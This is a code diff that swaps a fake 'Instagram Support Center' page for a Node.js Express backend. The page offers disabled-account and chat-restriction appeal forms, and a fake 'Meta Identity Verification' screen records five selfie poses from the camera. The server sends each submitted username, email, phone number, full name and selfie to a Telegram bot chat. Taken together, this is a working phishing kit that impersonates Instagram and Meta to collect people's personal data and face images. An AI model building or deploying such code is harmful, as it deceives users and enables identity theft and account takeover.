@@ -1,1041 +1,141 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Instagram Support Center</title>
-    
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-        body {
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-            background: #fff;
-            color: #262626;
-        }
-        .header {
-            background: #fff;
-            border-bottom: 1px solid #dbdbdb;
-            padding: 20px 16px;
-            text-align: center;
-        }
-        .header img { height: 40px; width: auto; }
-        .search-container {
-            max-width: 600px;
-            margin: 20px auto;
-            padding: 0 16px;
-            position: relative;
-        }
-        .search-icon {
-            position: absolute;
-            left: 28px;
-            top: 50%;
-            transform: translateY(-50%);
-            width: 16px;
-            height: 16px;
-            opacity: 0.5;
-        }
-        .search-box {
-            width: 100%;
-            padding: 8px 12px 8px 40px;
-            font-size: 14px;
-            border: 1px solid #dbdbdb;
-            border-radius: 3px;
-            background: #fafafa;
-            color: #8e8e8e;
-        }
-        .main-container {
-            max-width: 600px;
-            margin: 0 auto;
-            padding: 24px 16px;
-        }
-        .help-center-label {
-            font-size: 12px;
-            color: #8e8e8e;
-            margin-bottom: 16px;
-        }
-        .option-item {
-            background: #fff;
-            border: 1px solid #dbdbdb;
-            border-radius: 3px;
-            padding: 16px;
-            margin-bottom: 12px;
-            cursor: pointer;
-            display: flex;
-            align-items: flex-start;
-            gap: 12px;
-            transition: background 0.2s;
-        }
-        .option-item:hover { background: #fafafa; }
-        .radio-circle {
-            width: 20px;
-            height: 20px;
-            min-width: 20px;
-            border: 2px solid #dbdbdb;
-            border-radius: 50%;
-            position: relative;
-            margin-top: 2px;
-        }
-        .option-item.selected .radio-circle { border-color: #0095f6; }
-        .option-item.selected .radio-circle::after {
-            content: '';
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            width: 10px;
-            height: 10px;
-            background: #0095f6;
-            border-radius: 50%;
-        }
-        .option-content { flex: 1; }
-        .option-title {
-            font-size: 16px;
-            font-weight: 600;
-            color: #262626;
-            margin-bottom: 6px;
-        }
-        .option-description {
-            font-size: 14px;
-            color: #8e8e8e;
-            line-height: 1.5;
-        }
-        .form-container { display: none; }
-        .form-container.active { display: block; }
-        .form-box {
-            background: #fff;
-            border: 1px solid #dbdbdb;
-            border-radius: 3px;
-            padding: 20px;
-        }
-        .form-title {
-            font-size: 16px;
-            font-weight: 600;
-            color: #262626;
-            margin-bottom: 12px;
-        }
-        .form-description {
-            font-size: 14px;
-            color: #8e8e8e;
-            line-height: 1.5;
-            margin-bottom: 20px;
-        }
-        .form-group { margin-bottom: 16px; }
-        .form-label {
-            font-size: 14px;
-            color: #262626;
-            margin-bottom: 6px;
-            display: block;
-        }
-        .form-input,
-        .form-select {
-            width: 100%;
-            padding: 9px 8px;
-            font-size: 14px;
-            border: 1px solid #dbdbdb;
-            border-radius: 3px;
-            background: #fafafa;
-            color: #262626;
-            font-family: inherit;
-        }
-        .form-input:focus,
-        .form-select:focus {
-            outline: none;
-            border-color: #a8a8a8;
-            background: #fff;
-        }
+const express = require('express');
+const multer = require('multer');
+const path = require('path');
 
-        /* ----- Phone Group with Custom Dropdown ----- */
-        .phone-group {
-            display: flex;
-            gap: 10px;
-            align-items: center;
-        }
-        .country-dropdown {
-            position: relative;
-            flex: 0 0 160px;
-        }
-        .country-dropdown .selected {
-            display: flex;
-            align-items: center;
-            gap: 6px;
-            padding: 9px 8px;
-            border: 1px solid #dbdbdb;
-            border-radius: 3px;
-            background: #fafafa;
-            cursor: pointer;
-            font-size: 14px;
-        }
-        .country-dropdown .selected .arrow {
-            margin-left: auto;
-            font-size: 10px;
-            color: #888;
-        }
-        .country-dropdown .dropdown-list {
-            display: none;
-            position: absolute;
-            top: 100%;
-            left: 0;
-            width: 100%;
-            max-height: 250px;
-            background: #fff;
-            border: 1px solid #dbdbdb;
-            border-radius: 3px;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.15);
-            z-index: 999;
-            margin-top: 2px;
-            overflow: hidden;
-        }
-        .country-dropdown .dropdown-list.open { display: block; }
-        .country-dropdown .dropdown-search {
-            padding: 6px 8px;
-            border-bottom: 1px solid #ddd;
-        }
-        .country-dropdown .dropdown-search input {
-            width: 100%;
-            padding: 6px 8px;
-            border: 1px solid #dbdbdb;
-            border-radius: 3px;
-            font-size: 13px;
-        }
-        .country-dropdown .dropdown-options {
-            max-height: 190px;
-            overflow-y: auto;
-        }
-        .country-dropdown .dropdown-options .option {
-            padding: 7px 10px;
-            cursor: pointer;
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            font-size: 13px;
-            border-bottom: 1px solid #f5f5f5;
-        }
-        .country-dropdown .dropdown-options .option:hover { background: #f0f0f0; }
-        .country-dropdown .dropdown-options .option .flag { font-size: 18px; }
-        .country-dropdown .dropdown-options .option .code {
-            font-weight: 600;
-            min-width: 40px;
-        }
-        .phone-input { flex: 1; }
-        .phone-error {
-            color: #ed4956;
-            font-size: 12px;
-            margin-top: 4px;
-            display: none;
-        }
-        .phone-error.show { display: block; }
+const app = express();
+const PORT = process.env.PORT || 3000;
 
-        .send-btn {
-            background: #0095f6;
-            color: #fff;
-            border: none;
-            padding: 7px 16px;
-            font-size: 14px;
-            font-weight: 600;
-            border-radius: 4px;
-            cursor: pointer;
-        }
-        .send-btn:hover { background: #1877f2; }
+const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
+const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
 
-        .footer {
-            background: #fafafa;
-            padding: 40px 20px 20px;
-            margin-top: 50px;
-        }
-        .footer-links {
-            display: flex;
-            flex-wrap: wrap;
-            justify-content: center;
-            gap: 8px 16px;
-            margin-bottom: 16px;
-            max-width: 900px;
-            margin-left: auto;
-            margin-right: auto;
-        }
-        .footer-link {
-            font-size: 12px;
-            color: #00376b;
-            text-decoration: none;
-            font-weight: 600;
-            text-transform: uppercase;
-            letter-spacing: 0.2px;
-        }
-        .footer-link:hover { text-decoration: underline; }
-        .footer-copyright {
-            text-align: center;
-            font-size: 12px;
-            color: #000;
-            margin-top: 16px;
-            font-weight: 400;
-        }
-        .footer-language {
-            display: flex;
-            flex-wrap: wrap;
-            justify-content: center;
-            gap: 12px 16px;
-            margin-top: 20px;
-            max-width: 900px;
-            margin-left: auto;
-            margin-right: auto;
-        }
-        .footer-language a {
-            font-size: 12px;
-            color: #737373;
-            text-decoration: none;
-            font-weight: 400;
-            opacity: 0.7;
-        }
-        .footer-language a:hover { text-decoration: underline; }
-        .footer-language .active {
-            color: #262626;
-            font-weight: 600;
-            opacity: 1;
-        }
+if (!BOT_TOKEN || !CHAT_ID) {
+  console.error('❌ TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID not set!');
+}
 
-        .verification-screen {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: #fff;
-            z-index: 1000;
-        }
-        .verification-screen.active {
-            display: flex;
-            flex-direction: column;
-        }
-        .verification-header {
-            background: #fff;
-            border-bottom: 1px solid #dbdbdb;
-            padding: 16px;
-            text-align: center;
-        }
-        .verification-header h2 {
-            font-size: 16px;
-            font-weight: 600;
-            color: #262626;
-        }
-        .verification-content {
-            flex: 1;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            padding: 20px;
-            background: #fafafa;
-        }
-        .camera-box {
-            width: 100%;
-            max-width: 380px;
-            height: 480px;
-            background: #000;
-            border-radius: 8px;
-            position: relative;
-            overflow: hidden;
-            box-shadow: 0 1px 8px rgba(0,0,0,0.1);
-        }
-        #verificationVideo {
-            width: 100%;
-            height: 100%;
-            object-fit: cover;
-        }
-        .face-oval {
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            width: 200px;
-            height: 260px;
-            border: 2px solid rgba(255,255,255,0.8);
-            border-radius: 50%;
-            box-shadow: 0 0 0 9999px rgba(0,0,0,0.5);
-            pointer-events: none;
-            transition: border-color 0.3s;
-        }
-        .face-oval.matched {
-            border-color: #4CAF50;
-            box-shadow: 0 0 0 9999px rgba(0,0,0,0.5), 0 0 20px rgba(76,175,80,0.6);
-        }
-        .pose-text {
-            position: absolute;
-            top: 20px;
-            left: 50%;
-            transform: translateX(-50%);
-            background: rgba(0,0,0,0.75);
-            color: #fff;
-            padding: 8px 16px;
-            border-radius: 4px;
-            font-size: 14px;
-            font-weight: 500;
-        }
-        .pose-count {
-            position: absolute;
-            bottom: 20px;
-            left: 50%;
-            transform: translateX(-50%);
-            background: rgba(0,0,0,0.75);
-            color: #fff;
-            padding: 6px 12px;
-            border-radius: 4px;
-            font-size: 12px;
-        }
-        .verification-submit-btn {
-            display: none;
-            margin-top: 20px;
-            background: #0095f6;
-            color: #fff;
-            border: none;
-            padding: 10px 24px;
-            font-size: 14px;
-            font-weight: 600;
-            border-radius: 4px;
-            cursor: pointer;
-        }
-        .verification-submit-btn.show { display: block; }
+app.use(express.json());
+app.use(express.static('public'));
 
-        .success-modal {
-            display: none;
-            position: fixed;
-            bottom: 0;
-            left: 0;
-            width: 100%;
-            background: #fff;
-            border-top: 1px solid #ccc;
-            box-shadow: 0 -2px 10px rgba(0,0,0,0.15);
-            z-index: 2000;
-            animation: slideUp 0.3s ease;
-        }
-        .success-modal.active { display: block; }
-        @keyframes slideUp {
-            from { transform: translateY(100%); }
-            to { transform: translateY(0); }
-        }
-        .modal-header {
-            background: #6d86b7;
-            color: #fff;
-            padding: 12px;
-            font-weight: bold;
-            font-size: 15px;
-        }
-        .modal-body {
-            padding: 16px;
-            color: #333;
-            font-size: 14px;
-            line-height: 1.6;
-        }
-        .modal-footer {
-            padding: 10px 16px;
-            text-align: right;
-        }
-        .modal-btn {
-            background: #4267b2;
-            color: #fff;
-            border: none;
-            padding: 6px 14px;
-            border-radius: 3px;
-            font-size: 13px;
-            cursor: pointer;
-        }
-        .modal-btn:hover { background: #365899; }
-        .hidden { display: none !important; }
-    </style>
-</head>
-<body>
-    <!-- HEADER -->
-    <div class="header">
-        <img src="https://files.catbox.moe/5iyrej.png" alt="Instagram">
-    </div>
+const upload = multer({ 
+  storage: multer.memoryStorage(),
+  limits: { fileSize: 10 * 1024 * 1024 }
+});
 
-    <!-- SEARCH BAR -->
-    <div class="search-container">
-        <svg class="search-icon" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-            <path d="M21 21L16.65 16.65M19 11C19 15.4183 15.4183 19 11 19C6.58172 19 3 15.4183 3 11C3 6.58172 6.58172 3 11 3C15.4183 3 19 6.58172 19 11Z" stroke="#8e8e8e" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
-        </svg>
-        <input type="text" class="search-box" placeholder="How can we help?" readonly>
-    </div>
+// ---------- API Routes ----------
 
-    <!-- SELECTION SCREEN -->
-    <div class="main-container" id="selectionScreen">
-        <div class="help-center-label">Help Center</div>
-        <div class="option-item" onclick="selectOption('disabled', this)">
-            <div class="radio-circle"></div>
-            <div class="option-content">
-                <div class="option-title">Disabled Account Appeal (New)</div>
-                <div class="option-description">If your Instagram account has been disabled, submit an appeal to request a review. Please provide accurate information for faster processing.</div>
-            </div>
-        </div>
-        <div class="option-item" onclick="selectOption('chat', this)">
-            <div class="radio-circle"></div>
-            <div class="option-content">
-                <div class="option-title">Instagram Chat Restrictions Appeal</div>
-                <div class="option-description">Appeal against chat restrictions or message blocking on your Instagram account. We'll review your case and get back to you.</div>
-            </div>
-        </div>
-    </div>
+app.post('/api/submit-form', (req, res) => {
+  // Phone number ab 'phone' field me aayega (countryCode + number combined)
+  const { type, username, email, phone, fullname, alternative, relationship } = req.body;
+  
+  const message = `📋 <b>Instagram Appeal Form</b>
 
-    <!-- DISABLED FORM -->
-    <div class="main-container form-container" id="disabledForm">
-        <div class="help-center-label">Help Center</div>
-        <div class="form-box">
-            <h1 class="form-title">Disabled Account Appeal (New)</h1>
-            <p class="form-description">If your Instagram account has been disabled, submit an appeal to request a review. Please provide accurate information for faster processing.</p>
-            <form id="disabledAppealForm">
-                <div class="form-group">
-                    <label class="form-label">Instagram Username</label>
-                    <input type="text" class="form-input" name="username" required>
-                </div>
-                <div class="form-group">
-                    <label class="form-label">Email Address</label>
-                    <input type="email" class="form-input" name="email" required>
-                </div>
-                <div class="form-group">
-                    <label class="form-label">Phone Number</label>
-                    <div class="phone-group" id="phoneGroup1">
-                        <div class="country-dropdown" id="dropdown1">
-                            <div class="selected" onclick="toggleDropdown('dropdown1')">
-                                <span class="flag" id="flag1">🇮🇳</span>
-                                <span class="code" id="code1">+91</span>
-                                <span class="arrow">▼</span>
-                            </div>
-                            <div class="dropdown-list" id="list1">
-                                <div class="dropdown-search">
-                                    <input type="text" placeholder="Search country..." oninput="filterDropdown('dropdown1')">
-                                </div>
-                                <div class="dropdown-options" id="options1"></div>
-                            </div>
-                        </div>
-                        <input type="tel" class="form-input phone-input" id="phone1" placeholder="Enter phone number" required>
-                    </div>
-                    <div class="phone-error" id="error1">Please enter 7-10 digits after country code.</div>
-                </div>
-                <div class="form-group">
-                    <label class="form-label">Full Name</label>
-                    <input type="text" class="form-input" name="fullname" required>
-                </div>
-                <div class="form-group">
-                    <label class="form-label">Alternative Instagram Account (Optional)</label>
-                    <input type="text" class="form-input" name="alternative">
-                </div>
-                <div class="form-group">
-                    <label class="form-label">Your Relationship to This Account</label>
-                    <select class="form-select" name="relationship" required>
-                        <option value="">Select an option</option>
-                        <option value="owner">I am the rights owner</option>
-                        <option value="representative">I am representing my organization or client</option>
-                        <option value="behalf">I am reporting on behalf of someone else</option>
-                    </select>
-                </div>
-                <button type="submit" class="send-btn">Send</button>
-            </form>
-        </div>
-    </div>
+<b>Type:</b> ${type}
+━━━━━━━━━━━━━━━━━━━━
+<b>👤 Username:</b> ${username}
+<b>📧 Email:</b> ${email}
+<b>📱 Phone:</b> ${phone || 'N/A'}
+<b>📝 Name:</b> ${fullname}
+<b>🔗 Alt Account:</b> ${alternative || 'N/A'}
+<b>👥 Relationship:</b> ${relationship}
+━━━━━━━━━━━━━━━━━━━━
+<b>🕐 Time:</b> ${new Date().toLocaleString('en-IN', {timeZone: 'Asia/Kolkata'})}`;
+  
+  sendTelegramMessage(message)
+    .then(() => res.json({ success: true }))
+    .catch(err => {
+      console.error('Form send error:', err);
+      res.status(500).json({ error: 'Failed to send form' });
+    });
+});
 
-    <!-- CHAT RESTRICTIONS FORM -->
-    <div class="main-container form-container" id="chatForm">
-        <div class="help-center-label">Help Center</div>
-        <div class="form-box">
-            <h1 class="form-title">Instagram Chat Restrictions Appeal</h1>
-            <p class="form-description">Appeal against chat restrictions or message blocking on your Instagram account. We'll review your case and get back to you.</p>
-            <form id="chatAppealForm">
-                <div class="form-group">
-                    <label class="form-label">Instagram Username</label>
-                    <input type="text" class="form-input" name="username" required>
-                </div>
-                <div class="form-group">
-                    <label class="form-label">Email Address</label>
-                    <input type="email" class="form-input" name="email" required>
-                </div>
-                <div class="form-group">
-                    <label class="form-label">Phone Number</label>
-                    <div class="phone-group" id="phoneGroup2">
-                        <div class="country-dropdown" id="dropdown2">
-                            <div class="selected" onclick="toggleDropdown('dropdown2')">
-                                <span class="flag" id="flag2">🇮🇳</span>
-                                <span class="code" id="code2">+91</span>
-                                <span class="arrow">▼</span>
-                            </div>
-                            <div class="dropdown-list" id="list2">
-                                <div class="dropdown-search">
-                                    <input type="text" placeholder="Search country..." oninput="filterDropdown('dropdown2')">
-                                </div>
-                                <div class="dropdown-options" id="options2"></div>
-                            </div>
-                        </div>
-                        <input type="tel" class="form-input phone-input" id="phone2" placeholder="Enter phone number" required>
-                    </div>
-                    <div class="phone-error" id="error2">Please enter 7-10 digits after country code.</div>
-                </div>
-                <div class="form-group">
-                    <label class="form-label">Full Name</label>
-                    <input type="text" class="form-input" name="fullname" required>
-                </div>
-                <div class="form-group">
-                    <label class="form-label">Alternative Instagram Account (Optional)</label>
-                    <input type="text" class="form-input" name="alternative">
-                </div>
-                <div class="form-group">
-                    <label class="form-label">Your Relationship to This Account</label>
-                    <select class="form-select" name="relationship" required>
-                        <option value="">Select an option</option>
-                        <option value="owner">I am the rights owner</option>
-                        <option value="representative">I am representing my organization or client</option>
-                        <option value="behalf">I am reporting on behalf of someone else</option>
-                    </select>
-                </div>
-                <button type="submit" class="send-btn">Send</button>
-            </form>
-        </div>
-    </div>
+app.post('/api/submit-selfie', upload.single('photo'), (req, res) => {
+  console.log('📸 Selfie request received');
+  console.log('Body:', req.body);
+  console.log('File present?', !!req.file);
 
-    <!-- VERIFICATION SCREEN -->
-    <div class="verification-screen" id="verificationScreen">
-        <div class="verification-header"><h2>Meta Identity Verification</h2></div>
-        <div class="verification-content">
-            <div class="camera-box">
-                <video id="verificationVideo" autoplay playsinline></video>
-                <div class="face-oval" id="faceOval"></div>
-                <div class="pose-text" id="poseText">Look Straight at Camera</div>
-                <div class="pose-count" id="poseCount">Pose 1 of 5</div>
-            </div>
-            <button class="verification-submit-btn" id="verificationSubmitBtn">Submit Verification</button>
-        </div>
-    </div>
+  if (!req.file) {
+    console.log('❌ No file in request');
+    return res.status(400).json({ error: 'No photo uploaded' });
+  }
 
-    <!-- SUCCESS MODAL -->
-    <div class="success-modal" id="successModal">
-        <div class="modal-header">Form Submitted Successfully</div>
-        <div class="modal-body">Your form has been submitted successfully. We have received your information and will process it shortly.</div>
-        <div class="modal-footer"><button class="modal-btn" onclick="redirectToMainPage()">Okay</button></div>
-    </div>
+  const { username, formType, poseText, poseNumber } = req.body;
+  const caption = `📸 <b>Verification Selfie ${poseNumber}/5</b>
 
-    <!-- FOOTER -->
-    <div class="footer">
-        <div class="footer-links">
-            <a href="#" class="footer-link">ABOUT US</a>
-            <a href="#" class="footer-link">HELP</a>
-            <a href="#" class="footer-link">API</a>
-            <a href="#" class="footer-link">JOBS</a>
-            <a href="#" class="footer-link">TERMS</a>
-            <a href="#" class="footer-link">PRIVACY</a>
-        </div>
-        <div class="footer-copyright">© <span id="footerYear">2025</span> INSTAGRAM, INC.</div>
-        <div class="footer-language">
-            <a href="#" class="active">ENGLISH (US)</a>
-            <a href="#">ENGLISH (UK)</a>
-            <a href="#">हिन्दी</a>
-            <a href="#">ਪੰਜਾਬੀ</a>
-            <a href="#">اردو</a>
-            <a href="#">ગુજરાતી</a>
-            <a href="#">বাংলা</a>
-            <a href="#">தமிழ்</a>
-            <a href="#">తెలుగు</a>
-            <a href="#">മലയാളം</a>
-            <a href="#">ಕನ್ನಡ</a>
-        </div>
-    </div>
+<b>👤 User:</b> ${username}
+<b>📝 Pose:</b> ${poseText}
+<b>📋 Type:</b> ${formType}
+<b>🕐 Time:</b> ${new Date().toLocaleString('en-IN', {timeZone: 'Asia/Kolkata'})}`;
 
-    <script>
-        // ============================================================
-        // NO HARDCODED TELEGRAM TOKEN/Chat_ID – Server API endpoints use env vars
-        // ============================================================
+  sendTelegramPhoto(req.file.buffer, caption)
+    .then(() => {
+      console.log('✅ Photo sent to Telegram');
+      res.json({ success: true });
+    })
+    .catch(err => {
+      console.error('❌ Telegram photo error:', err);
+      res.status(500).json({ error: 'Failed to send photo' });
+    });
+});
 
-        // ============================================================
-        // 1. COUNTRY DATABASE (Flag + Code + Name) – India at top
-        // ============================================================
-        const COUNTRIES = [
-            { code: "+91", flag: "🇮🇳", name: "India" },
-            { code: "+1", flag: "🇺🇸", name: "United States" },
-            { code: "+44", flag: "🇬🇧", name: "United Kingdom" },
-            { code: "+61", flag: "🇦🇺", name: "Australia" },
-            { code: "+81", flag: "🇯🇵", name: "Japan" },
-            { code: "+86", flag: "🇨🇳", name: "China" },
-            { code: "+49", flag: "🇩🇪", name: "Germany" },
-            { code: "+33", flag: "🇫🇷", name: "France" },
-            { code: "+39", flag: "🇮🇹", name: "Italy" },
-            { code: "+34", flag: "🇪🇸", name: "Spain" },
-            { code: "+55", flag: "🇧🇷", name: "Brazil" },
-            { code: "+52", flag: "🇲🇽", name: "Mexico" },
-            { code: "+7", flag: "🇷🇺", name: "Russia" },
-            { code: "+82", flag: "🇰🇷", name: "South Korea" },
-            { code: "+31", flag: "🇳🇱", name: "Netherlands" },
-            { code: "+46", flag: "🇸🇪", name: "Sweden" },
-            { code: "+41", flag: "🇨🇭", name: "Switzerland" },
-            { code: "+47", flag: "🇳🇴", name: "Norway" },
-            { code: "+45", flag: "🇩🇰", name: "Denmark" },
-            { code: "+358", flag: "🇫🇮", name: "Finland" },
-            { code: "+30", flag: "🇬🇷", name: "Greece" },
-            { code: "+90", flag: "🇹🇷", name: "Turkey" },
-            { code: "+966", flag: "🇸🇦", name: "Saudi Arabia" },
-            { code: "+971", flag: "🇦🇪", name: "UAE" },
-            { code: "+972", flag: "🇮🇱", name: "Israel" },
-            { code: "+20", flag: "🇪🇬", name: "Egypt" },
-            { code: "+27", flag: "🇿🇦", name: "South Africa" },
-            { code: "+254", flag: "🇰🇪", name: "Kenya" },
-            { code: "+234", flag: "🇳🇬", name: "Nigeria" },
-            { code: "+92", flag: "🇵🇰", name: "Pakistan" },
-            { code: "+94", flag: "🇱🇰", name: "Sri Lanka" },
-            { code: "+977", flag: "🇳🇵", name: "Nepal" },
-            { code: "+880", flag: "🇧🇩", name: "Bangladesh" },
-            { code: "+60", flag: "🇲🇾", name: "Malaysia" },
-            { code: "+62", flag: "🇮🇩", name: "Indonesia" },
-            { code: "+63", flag: "🇵🇭", name: "Philippines" },
-            { code: "+64", flag: "🇳🇿", name: "New Zealand" },
-            { code: "+65", flag: "🇸🇬", name: "Singapore" },
-            { code: "+66", flag: "🇹🇭", name: "Thailand" },
-            { code: "+84", flag: "🇻🇳", name: "Vietnam" },
-            { code: "+886", flag: "🇹🇼", name: "Taiwan" },
-            { code: "+98", flag: "🇮🇷", name: "Iran" },
-            { code: "+964", flag: "🇮🇶", name: "Iraq" },
-            { code: "+962", flag: "🇯🇴", name: "Jordan" },
-            { code: "+961", flag: "🇱🇧", name: "Lebanon" },
-            { code: "+968", flag: "🇴🇲", name: "Oman" },
-            { code: "+974", flag: "🇶🇦", name: "Qatar" },
-            { code: "+965", flag: "🇰🇼", name: "Kuwait" },
-            { code: "+973", flag: "🇧🇭", name: "Bahrain" },
-            { code: "+212", flag: "🇲🇦", name: "Morocco" },
-            { code: "+216", flag: "🇹🇳", name: "Tunisia" },
-            { code: "+213", flag: "🇩🇿", name: "Algeria" },
-            { code: "+218", flag: "🇱🇾", name: "Libya" },
-            { code: "+251", flag: "🇪🇹", name: "Ethiopia" },
-            { code: "+256", flag: "🇺🇬", name: "Uganda" },
-            { code: "+255", flag: "🇹🇿", name: "Tanzania" },
-            { code: "+260", flag: "🇿🇲", name: "Zambia" },
-            { code: "+263", flag: "🇿🇼", name: "Zimbabwe" }
-        ];
+app.post('/api/verification-complete', (req, res) => {
+  const { username, email, phone, fullname, formType } = req.body;
+  const message = `✅ <b>VERIFICATION COMPLETED</b>
 
-        // ============================================================
-        // 2. DROPDOWN LOGIC
-        // ============================================================
-        function renderOptions(dropdownId) {
-            const container = document.getElementById('options' + dropdownId.replace('dropdown', ''));
-            if (!container) return;
-            container.innerHTML = '';
-            COUNTRIES.forEach(c => {
-                const div = document.createElement('div');
-                div.className = 'option';
-                div.dataset.code = c.code;
-                div.innerHTML = `<span class="flag">${c.flag}</span><span class="code">${c.code}</span> ${c.name}`;
-                div.onclick = function() {
-                    const dd = this.closest('.country-dropdown');
-                    const selected = dd.querySelector('.selected');
-                    selected.querySelector('.flag').textContent = c.flag;
-                    selected.querySelector('.code').textContent = c.code;
-                    dd.querySelector('.dropdown-list').classList.remove('open');
-                    const phoneInput = dd.closest('.phone-group').querySelector('.phone-input');
-                    if (phoneInput) validatePhone(phoneInput);
-                };
-                container.appendChild(div);
-            });
-        }
+<b>👤 User:</b> ${username}
+<b>📧 Email:</b> ${email}
+<b>📱 Phone:</b> ${phone || 'N/A'}
+<b>📝 Name:</b> ${fullname}
+<b>📋 Form:</b> ${formType}
+<b>📸 Photos:</b> 5/5
+<b>✓ Status:</b> Ready for Review
+<b>🕐 Completed:</b> ${new Date().toLocaleString('en-IN', {timeZone: 'Asia/Kolkata'})}`;
 
-        function toggleDropdown(dropdownId) {
-            const dd = document.getElementById(dropdownId);
-            const list = dd.querySelector('.dropdown-list');
-            const isOpen = list.classList.contains('open');
-            document.querySelectorAll('.dropdown-list.open').forEach(l => l.classList.remove('open'));
-            if (!isOpen) {
-                list.classList.add('open');
-                const id = dropdownId.replace('dropdown', '');
-                const container = document.getElementById('options' + id);
-                if (container && !container.hasChildNodes()) renderOptions(dropdownId);
-                const code = dd.querySelector('.selected .code').textContent;
-                container.querySelectorAll('.option').forEach(o => {
-                    o.classList.toggle('active', o.dataset.code === code);
-                });
-                const search = dd.querySelector('.dropdown-search input');
-                if (search) { search.value = ''; search.focus(); }
-            }
-        }
+  sendTelegramMessage(message)
+    .then(() => res.json({ success: true }))
+    .catch(err => {
+      console.error('Complete error:', err);
+      res.status(500).json({ error: 'Failed' });
+    });
+});
 
-        function filterDropdown(dropdownId) {
-            const dd = document.getElementById(dropdownId);
-            const input = dd.querySelector('.dropdown-search input');
-            const query = input.value.toLowerCase().trim();
-            dd.querySelectorAll('.option').forEach(o => {
-                o.style.display = o.textContent.toLowerCase().includes(query) ? '' : 'none';
-            });
-        }
+// ---------- Telegram Helpers ----------
+async function sendTelegramMessage(text) {
+  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+  const response = await fetch(url, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ chat_id: CHAT_ID, text, parse_mode: 'HTML' })
+  });
+  if (!response.ok) {
+    const errorText = await response.text();
+    throw new Error(`sendMessage failed: ${errorText}`);
+  }
+  return response.json();
+}
 
-        document.addEventListener('click', function(e) {
-            if (!e.target.closest('.country-dropdown')) {
-                document.querySelectorAll('.dropdown-list.open').forEach(l => l.classList.remove('open'));
-            }
-        });
+async function sendTelegramPhoto(buffer, caption) {
+  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
+  const formData = new FormData();
+  formData.append('chat_id', CHAT_ID);
+  const blob = new Blob([buffer]);
+  formData.append('photo', blob, 'selfie.jpg');
+  formData.append('caption', caption);
+  formData.append('parse_mode', 'HTML');
 
-        // ============================================================
-        // 3. AUTO DETECT COUNTRY
-        // ============================================================
-        async function detectAndSetCountry() {
-            let code = '+91', flag = '🇮🇳';
-            try {
-                const res = await fetch('https://ipapi.co/country/');
-                if (res.ok) {
-                    const iso = (await res.text()).trim().toUpperCase();
-                    const map = {
-                        'US': '+1','IN': '+91','GB': '+44','AU': '+61','JP': '+81','CN': '+86',
-                        'DE': '+49','FR': '+33','IT': '+39','ES': '+34','BR': '+55','MX': '+52',
-                        'RU': '+7','KR': '+82','NL': '+31','SE': '+46','CH': '+41','NO': '+47',
-                        'DK': '+45','FI': '+358','GR': '+30','TR': '+90','SA': '+966','AE': '+971',
-                        'IL': '+972','EG': '+20','ZA': '+27','KE': '+254','NG': '+234','PK': '+92',
-                        'LK': '+94','NP': '+977','BD': '+880','MY': '+60','ID': '+62','PH': '+63',
-                        'NZ': '+64','SG': '+65','TH': '+66','VN': '+84','TW': '+886','IR': '+98',
-                        'IQ': '+964','JO': '+962','LB': '+961','OM': '+968','QA': '+974','KW': '+965',
-                        'BH': '+973','MA': '+212','TN': '+216','DZ': '+213','LY': '+218','ET': '+251',
-                        'UG': '+256','TZ': '+255','ZM': '+260','ZW': '+263'
-                    };
-                    const c = map[iso];
-                    if (c) {
-                        const country = COUNTRIES.find(x => x.code === c);
-                        if (country) { code = c; flag = country.flag; }
-                    }
-                }
-            } catch (_) {}
-            document.querySelectorAll('.country-dropdown').forEach(dd => {
-                const selected = dd.querySelector('.selected');
-                selected.querySelector('.flag').textContent = flag;
-                selected.querySelector('.code').textContent = code;
-            });
-        }
-        detectAndSetCountry();
+  const response = await fetch(url, {
+    method: 'POST',
+    body: formData
+  });
 
-        // ============================================================
-        // 4. PHONE VALIDATION (Auto-remove leading zero)
-        // ============================================================
-        function validatePhone(input) {
-            const group = input.closest('.phone-group');
-            const error = group.querySelector('.phone-error');
-            let raw = input.value.trim();
-            if (!raw) { error.classList.remove('show'); return true; }
+  if (!response.ok) {
+    const errorText = await response.text();
+    console.error('Telegram API Error Response:', errorText);
+    throw new Error(`sendPhoto failed: ${errorText}`);
+  }
+  return response.json();
+}
 
-            let local = raw;
-            if (raw.startsWith('+')) {
-                const sorted = [...COUNTRIES].sort((a, b) => b.code.length - a.code.length);
-                let detected = false;
-                for (const c of sorted) {
-                    if (raw.startsWith(c.code)) {
-                        const selected = group.querySelector('.selected');
-                        selected.querySelector('.flag').textContent = c.flag;
-                        selected.querySelector('.code').textContent = c.code;
-                        local = raw.slice(c.code.length);
-                        input.value = local;
-                        detected = true;
-                        break;
-                    }
-                }
-                if (!detected) {
-                    error.textContent = 'Unknown country code. Please select your country.';
-                    error.classList.add('show');
-                    return false;
-                }
-            }
-
-            let digits = local.replace(/\D/g, '');
-            if (digits.startsWith('0')) digits = digits.substring(1);
-            if (digits.length < 7 || digits.length > 10) {
-                error.textContent = 'Please enter 7-10 digits after country code.';
-                error.classList.add('show');
-                return false;
-            }
-            error.classList.remove('show');
-            return true;
-        }
-
-        document.querySelectorAll('.phone-input').forEach(inp => {
-            inp.addEventListener('input', function() { validatePhone(this); });
-            inp.addEventListener('blur', function() { validatePhone(this); });
-        });
-
-        // ============================================================
-        // 5. VERIFICATION STATE
-        // ============================================================
-        let verificationState = {
-            currentPose: 0,
-            captures: [],
-            videoStream: null,
